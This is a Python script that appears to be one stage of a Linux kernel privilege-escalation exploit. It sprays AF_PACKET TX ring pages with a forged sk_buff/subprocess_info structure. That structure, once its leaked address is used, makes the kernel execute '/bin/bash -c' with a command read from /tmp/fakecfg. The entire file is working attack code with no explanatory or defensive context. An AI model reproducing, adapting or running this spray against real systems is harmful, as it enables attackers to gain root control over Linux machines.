#!/usr/bin/env python3
"""ringspray2.py <cpu> <count> - hold AF_PACKET TX rings and, once
/tmp/fakecfg appears (g exec work cmd), write the fake sk_buff page blob
into every 4K block of every ring, so whichever block address G leaks is the
one carrying the fake skb with G-relative pointers."""
import socket, struct, mmap, os, sys, time
cpu=int(sys.argv[1]); n=int(sys.argv[2])
os.sched_setaffinity(0,{cpu})
ETH_P_ALL=3; SOL_PACKET=263; PACKET_VERSION=10; PACKET_TX_RING=13; TPACKET_V1=0
BS=4096; BN=12
req=struct.pack("IIII",BS,BN,2048,24)
keep=[]
for i in range(n):
    s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.bind(("lo",0)); s.setsockopt(SOL_PACKET,PACKET_VERSION,TPACKET_V1)
    s.setsockopt(SOL_PACKET,PACKET_TX_RING,req)
    m=mmap.mmap(s.fileno(), BS*BN, mmap.MAP_SHARED, mmap.PROT_READ|mmap.PROT_WRITE)
    keep.append(m)
print("rings",len(keep),"blk",BN,flush=True)

def build(P, ex, wk, cmd):
    b=bytearray(BS)
    def w(off,val,n=8): b[off:off+n]=int(val).to_bytes(n,'little')
    o=0x10                          # fake skb (subprocess_info) page offset
    S=P+o                          # its absolute kernel address
    w(o+0,0); w(o+8,S+8); w(o+16,S+8); w(o+24,wk); w(o+32,0)
    w(o+40,P+0x400); w(o+48,P+0x480); w(o+56,P+0x500)
    w(o+64,0,4); w(o+68,0,4); w(o+72,0); w(o+80,0); w(o+88,0)
    w(o+96,ex); w(o+104,0); b[o+126]=0x05; w(o+128,0)
    w(o+192,0x100,4); w(o+200,P+0x100); w(o+220,1,4); w(o+224,0); w(o+464,5,4)
    w(0x220,2,4)                    # shinfo.dataref at P+0x200+0x20
    b[0x400:0x409]=b"/bin/bash"
    b[0x420:0x423]=b"-c\x00"
    cm=cmd.encode()[:0x2ff]
    b[0x600:0x600+len(cm)]=cm
    w(0x480,P+0x400); w(0x488,P+0x420); w(0x490,P+0x600); w(0x498,0)
    b[0x540:0x547]=b"HOME=/\x00"
    pe=b"PATH=/sbin:/bin:/usr/sbin:/usr/bin"
    b[0x548:0x548+len(pe)+1]=pe+b"\x00"
    w(0x500,P+0x540); w(0x508,P+0x548); w(0x510,0)
    return bytes(b)

last=""
while True:
    try:
        cfg=open("/tmp/fakecfg").read().strip()
    except OSError:
        cfg=""
    if cfg and cfg!=last:
        try:
            g,ex,wk,cmd=cfg.split(" ",3)
            g=int(g,0); ex=int(ex,0); wk=int(wk,0)
            blob=build(g,ex,wk,cmd)
            for m in keep:
                for k in range(BN):
                    m[k*BS:(k+1)*BS]=blob
            last=cfg
            print("wrote fake skb for G=%#x ex=%#x wk=%#x"%(g,ex,wk),flush=True)
        except Exception as e:
            print("cfg err",e,flush=True)
    time.sleep(0.5)
